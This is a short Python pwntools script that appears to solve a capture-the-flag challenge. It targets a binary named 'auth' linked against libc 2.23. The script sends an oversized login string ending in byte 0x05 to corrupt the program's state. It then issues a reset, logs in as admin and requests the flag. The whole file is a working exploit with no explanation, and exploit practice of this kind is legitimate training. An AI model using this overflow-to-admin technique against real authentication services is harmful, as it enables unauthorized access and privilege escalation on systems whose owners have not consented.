#!/usr/bin/env python3

from pwn import *

exe = ELF("./auth")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    r.sendline("login " + "A" * 8 + "\x05")
    r.sendline("reset")

    r.sendline("login admin")
    r.sendline("get-flag")

    r.interactive()


if __name__ == "__main__":
    main()
